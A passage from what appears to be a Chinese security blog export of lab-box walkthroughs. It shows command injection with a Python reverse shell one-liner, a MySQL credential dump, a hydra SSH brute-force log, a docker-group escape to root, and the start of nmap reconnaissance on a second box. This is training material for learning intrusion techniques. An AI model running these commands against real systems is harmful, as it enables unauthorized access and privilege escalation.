href="#1-Getshell" class="headerlink" title="1-Getshell"></a>1-Getshell</h3><p>直接<code>RCE</code>，尝试反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506260914368.png"></p><p>拿到shell权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.39] 42292<br>$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(www-data) gid=50(staff) <span class="hljs-built_in">groups</span>=50(staff)<br></code></pre></td></tr></table></figure><h3 id="2-尝试docker逃逸"><a href="#2-尝试docker逃逸" class="headerlink" title="2-尝试docker逃逸"></a>2-尝试docker逃逸</h3><p>查看<code>/</code>，发现存在<code>.dockerenv</code>，故判定进入的是一个docker容器，需尝试docker逃逸，但经过尝试无法逃逸成功。</p><h1 id="Mysql渗透"><a href="#Mysql渗透" class="headerlink" title="Mysql渗透"></a>Mysql渗透</h1><p>查看文件，找到数据库的用户名和密码以及数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">ls</span><br>config.inc.php  function.php  mysql.inc.php  showvcode.php  uploadfunction.php<br>www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">cat</span> config.inc.php <br>&lt;?php<br>//全局session_start<br>session_start();<br>//全局居设置时区<br>date_default_timezone_set(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br>//全局设置默认字符<br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>//定义数据库连接参数<br>define(<span class="hljs-string">&#x27;DBHOST&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);//将localhost或者127.0.0.1修改为数据库服务器的地址<br>define(<span class="hljs-string">&#x27;DBUSER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);//将root修改为连接mysql的用户名<br>define(<span class="hljs-string">&#x27;DBPW&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说！<br>define(<span class="hljs-string">&#x27;DBNAME&#x27;</span>, <span class="hljs-string">&#x27;pikachu&#x27;</span>);//自定义，建议不修改<br>define(<span class="hljs-string">&#x27;DBPORT&#x27;</span>, <span class="hljs-string">&#x27;3306&#x27;</span>);//将3306修改为mysql的连接端口，默认tcp3306<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="1、连接数据库"><a href="#1、连接数据库" class="headerlink" title="1、连接数据库"></a>1、连接数据库</h2><p>由于数据库不需要密码，直接回车即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ mysql -uroot -p<br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 3<br>Server version: 5.7.26-0ubuntu0.18.04.1-<span class="hljs-built_in">log</span> (Ubuntu)<br><br>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; <br></code></pre></td></tr></table></figure><h2 id="2、查看数据库数据"><a href="#2、查看数据库数据" class="headerlink" title="2、查看数据库数据"></a>2、查看数据库数据</h2><p>进入<code>pikachu</code>数据库，查看<code>user表</code>，找到一个用户<code>ml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use pikachu<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_pikachu |<br>+-------------------+<br>| httpinfo          |<br>| member            |<br>| message           |<br>| <span class="hljs-built_in">users</span>             |<br>| xssblind          |<br>+-------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+----+----------+----------------------------------+-------+<br>| <span class="hljs-built_in">id</span> | username | password                         | level |<br>+----+----------+----------------------------------+-------+<br>|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |     1 |<br>|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd |     2 |<br>|  3 | <span class="hljs-built_in">test</span>     | e99a18c428cb38d5f260853678922e03 |     3 |<br>|  4 | ml       | I heard you like explosives      |     4 |<br>+----+----------+----------------------------------+-------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p><code>password</code>显示<code>I heard you like explosives</code>，提示我们需要进行爆破</p><h1 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h1><p>根据在<code>users</code>表里面查看到的提示，尝试进行爆破<br>同时在<code>/tmp</code>目录下面找到一个<code>hint.txt</code>，提示<code>密码也需是由用户名组成</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">cat</span> /tmp/hint.txt <br>Maybe passwords are all made up of usernames<br></code></pre></td></tr></table></figure><h2 id="1、构造字典"><a href="#1、构造字典" class="headerlink" title="1、构造字典"></a>1、构造字典</h2><p>查找<code>rockyou</code>字典里面包含<code>ml</code>的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep <span class="hljs-string">&#x27;^ml&#x27;</span> &gt; ml.txt<br></code></pre></td></tr></table></figure><h2 id="2、hydra爆破"><a href="#2、hydra爆破" class="headerlink" title="2、hydra爆破"></a>2、hydra爆破</h2><p><code>hydra -l ml -P ml.txt ssh://192.168.2.39 -vV </code><br>成功找到密码<code>mlmlml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# hydra -l ml -P ml.txt ssh://192.168.2.39 -vV <br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-26 09:42:03<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 5819 login tries (l:1/p:5819), ~364 tries per task<br>[DATA] attacking ssh://192.168.2.39:22/<br>[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="hljs-keyword">done</span><br>[INFO] Testing <span class="hljs-keyword">if</span> password authentication is supported by ssh://ml@192.168.2.39:22<br>[INFO] Successful, password authentication is supported by ssh://192.168.2.39:22<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlb123&quot;</span> - 1 of 5819 [child 0] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlmlml&quot;</span> - 2 of 5819 [child 1] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mladen&quot;</span> - 3 of 5819 [child 2] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlover&quot;</span> - 4 of 5819 [child 3] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlm123&quot;</span> - 5 of 5819 [child 4] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlking&quot;</span> - 6 of 5819 [child 5] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlc123&quot;</span> - 7 of 5819 [child 6] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;ml1234&quot;</span> - 8 of 5819 [child 7] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlp123&quot;</span> - 9 of 5819 [child 8] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlovem&quot;</span> - 10 of 5819 [child 9] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlkmlk&quot;</span> - 11 of 5819 [child 10] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlovesj&quot;</span> - 12 of 5819 [child 11] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlopez&quot;</span> - 13 of 5819 [child 12] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlmmlm&quot;</span> - 14 of 5819 [child 13] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mleigh&quot;</span> - 15 of 5819 [child 14] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mluisa&quot;</span> - 16 of 5819 [child 15] (0/0)<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[VERBOSE] Disabled child 8 because of too many errors<br>[VERBOSE] Disabled child 12 because of too many errors<br>[VERBOSE] Disabled child 14 because of too many errors<br>[22][ssh] host: 192.168.2.39   login: ml   password: mlmlml<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.39 (waiting <span class="hljs-keyword">for</span> children to complete tests)<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-26 09:42:19<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong><br>根据爆破出来的用户名<code>ml</code>和密码<code>mlmlml</code>，进行ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh ml@192.168.2.39                   <br>ml@192.168.2.39 is password: <br>Linux language 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>ml@language:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>ml@language:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;this-is-user-flag!!!&#125;<br></code></pre></td></tr></table></figure><h1 id="提权-Docker逃逸"><a href="#提权-Docker逃逸" class="headerlink" title="提权-Docker逃逸"></a>提权-Docker逃逸</h1><p>使用<code>sudo -l</code>进行查看，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> ml: <br></code></pre></td></tr></table></figure><p>查看用户<code>id</code>，发现用户名<code>ml</code>属于<code>docker组</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:~$ <span class="hljs-built_in">id</span><br>uid=1001(ml) gid=1001(ml) <span class="hljs-built_in">groups</span>=1001(ml),113(docker)<br></code></pre></td></tr></table></figure><p>Docker守护进程允许docker用户组的成员和root用户访问Docker。 当前用户如果属于这个组，就可以使用Docker命令尝试提权。</p><p>拉取镜像启动一个新的容器，以<code>sh</code>或者<code>/bin/bash</code>作为<code>shell</code>启动，并将宿主机的<code>/</code>目录挂载到容器的<code>/mnt</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:/tmp$ docker ps<br>CONTAINER ID   IMAGE            COMMAND     CREATED      STATUS             PORTS                            NAMES<br>b0dd1db70539   area39/pikachu   <span class="hljs-string">&quot;/run.sh&quot;</span>   2 days ago   Up About an hour   3306/tcp, 0.0.0.0:9999-&gt;80/tcp   pikachu<br>ml@language:/tmp$ docker run -v /:/mnt --<span class="hljs-built_in">rm</span> -it area39/pikachu <span class="hljs-built_in">chroot</span> /mnt sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/root.txt</span><br>flag&#123;this-is-root-flag!!!&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、Docker逃逸"><a href="#1、Docker逃逸" class="headerlink" title="1、Docker逃逸"></a>1、Docker逃逸</h2><p>相关文章：<a href="https://wiki.teamssix.com/CloudNative/Docker/">Docker 介绍 | T Wiki</a></p><h2 id="2、Mysql常用命令"><a href="#2、Mysql常用命令" class="headerlink" title="2、Mysql常用命令"></a>2、Mysql常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接数据库</span><br>mysql -h<span class="hljs-variable">$IP</span> -uroot -p<span class="hljs-variable">$passwd</span> -P3306<br><br><span class="hljs-comment">#查库</span><br>show databases; - 列出所有数据库<br><br><span class="hljs-comment">#选择/切换数据库</span><br>use database_name; - 进入指定数据库<br><span class="hljs-keyword">select</span> database(); - 查看当前所在数据库<br><br><span class="hljs-comment">#查表</span><br>show tables; - 当前库的所有表<br>show tables from db_name; - 查看其他库的表<br><br><span class="hljs-comment">#查字段</span><br><span class="hljs-keyword">select</span> * from table_name;<br>show columns from table_name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内部靶机/Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hydra</tag>
      
      <tag>mysql</tag>
      
      <tag>docker逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Space</title>
    <link href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Space/"/>
    <url>/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Space/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00058s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00074s latency).<br>MAC Address: 08:00:27:DA:82:3D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.21 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.38</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00035s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 38.95 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00058s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Typing Challenge<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.72 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232334381.png"><br>提示打字游戏，输入上面的文字，完成后有提示，根据步骤，完成上述的打字游戏，得到提示<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232336591.png"></p><p>访问<code>andeli.id_rsa</code>，猜测是<code>andeli</code>用户的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE 